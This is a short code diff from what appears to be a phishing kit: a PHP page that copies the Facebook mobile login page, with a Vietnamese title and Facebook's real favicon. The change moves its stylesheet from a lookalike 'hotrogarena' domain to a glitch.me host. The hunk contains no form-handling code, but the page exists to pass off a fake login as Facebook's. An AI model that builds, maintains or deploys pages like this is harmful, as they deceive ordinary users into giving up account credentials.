@@ -34,7 +34,7 @@ $_SESSION['huongdz'] = $huongdz;
             <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
             <title>Facebook- Đăng nhập hoặc đăng ký</title>
             <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
-            <link rel="stylesheet" type="text/css" href="https://auth-hotrogarena-vn.com/css/0b76fb06ca549b92ce7edf6aad13aeba.css" />
+          <link rel="stylesheet" type="text/css" href="https://scripth.glitch.me/web/fb.css" />
         </head>
  
         <body class="touch x1 _fzu _50-3 iframe acw portrait">
